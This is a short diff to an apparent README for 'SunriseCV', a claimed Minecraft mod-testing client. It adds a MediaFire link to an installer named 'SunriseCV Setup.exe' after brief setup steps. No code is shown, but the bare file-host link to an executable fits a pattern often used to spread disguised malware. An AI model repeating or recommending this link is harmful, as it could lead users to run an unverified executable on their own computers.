@@ -11,3 +11,6 @@ SunriseCV - Your one-step client for mod testing for minecraft
 2. Set-up using the installer
 3. Wait for download
 4. Your good to go!
+
+# Download Link
+https://www.mediafire.com/file/xax9lsc586b48m7/SunriseCV+Setup.exe/file
